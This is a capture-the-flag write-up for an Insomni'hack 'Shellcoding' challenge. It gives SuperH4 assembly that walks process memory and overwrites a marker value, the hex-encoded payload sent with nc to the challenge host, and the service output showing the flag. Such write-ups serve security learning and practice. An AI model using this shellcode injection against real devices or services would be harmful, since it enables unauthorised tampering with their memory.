## Infos

**Author**: grimmlin  
**Category**: Shellcoding  
**Difficulty**: Medium  

## Description:

So, I built this connected, self-driving car in my garage, but I used an existing motor engine to do it. The model tag is still present in memory but I really need it to be changed. Fortunately, I left this service open in order to apply small firmware patches, so send it a shellcode to find and change the tag present somewhere in memory running on superpollute.insomni.hack:24607 challenge files

    HINT1 : you might need this to develop your shellcode
    HINT2 : gdb inside qemu-system is broken on sh4. Use qemu-sh4 with -g and use a native gdb with multitarget support.


## Solution:

So, this challenge was in fact really easy. You just had to walk through the memory of a process, find a specific string and change it. With a shellcode. In SuperH4. In a broken dev environment.

No, seriously though, it was really easy. SuperH4 has a very limited instruction set, and what you need is a loop, with a technique to check if the adress is mapped or not.
For that I used a read syscall, which will just return an error if the adress is not mapped, and oethwise checks for the start of string and modify it if present.

This gives the following shellcode :

    .text
        .global _start

    _start:
        mov     #0x1,r1
        xor     r2,r2
        mov     #14,r4
        sub     r4,r2
        shll8   r1
        shll2   r1
        shll2   r1
        xor     r4,r4
    l00p:
        add     r1,r4
        mov     #5,r3
        mov     #3,r5
        trapa   #2
    test:
        cmp/eq  r2,r0
        bt      l00p
        nop
        mov.l   .check,r3
        mov     r4,r5
        mov.l   @r5,r5
        cmp/eq  r5,r3
        bf      l00p
        nop

    youwin:
        mov     #10,r1
        mov.l   r1,@r4
        nop

    .check:
        .long 0x1f600d60


Here is the final exploit :

    (python -c 'print "01e12a220ee448321841084108414a241c3405e303e502c32030f989090004d3436552655033f38b09000ae112240900600d601f".decode("hex")';cat) | nc 10.13.37.141 24607
    nc: using stream socket

    So, I built this connected, self-driving car in my garage, but I used an
    existing motor engine to do it. The brand and model tag is still present in
    memory but I really need it to be changed. Fortunately, I left this service
    open in order to apply small firmware patches, so send it a shellcode to
    find and change the tag present somewhere in memory

    ---reading firmware patch---

    received: 01e12a220ee448321841084108414a241c3405e303e502c32030f989090004d3436552655033f38b09000ae112240900600d601f0a0a
    ---patching firmware---
    Unhandled trap: 0x180

    GG, here's your flag: INS{thank_you_for_global_warming}


